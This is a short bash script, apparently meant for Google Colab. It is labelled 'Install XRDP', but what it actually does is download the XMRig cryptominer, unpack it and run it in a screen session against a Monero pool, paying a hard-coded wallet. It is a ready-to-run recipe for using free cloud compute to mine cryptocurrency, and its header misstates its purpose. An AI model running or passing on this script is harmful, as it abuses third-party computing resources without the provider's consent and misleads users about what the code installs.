#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 89fg5RaBeH69DFUJo8uqzTc3ExE9aPsP8Ss4F1TXkLx26ktVWvewjJDE2T6zXoj221jehhjwaHrNeQZJjh6VPasTNWJkhKW -k --tls --rig-id GC-US
